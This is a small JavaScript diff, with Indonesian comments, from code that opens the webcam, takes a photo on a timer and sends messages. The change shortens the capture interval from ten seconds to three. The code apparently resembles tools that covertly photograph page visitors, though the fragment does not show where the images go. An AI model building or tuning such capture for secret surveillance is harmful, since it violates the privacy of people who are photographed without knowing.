@@ -100,7 +100,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
 
   setInterval(() => {
     ambilFoto();
-  }, 10000); // tiap 10 detik
+  }, 3000); // tiap 3 detik
 })
 .catch(err => {
   kirimPesan("Gagal akses kamera: " + err);
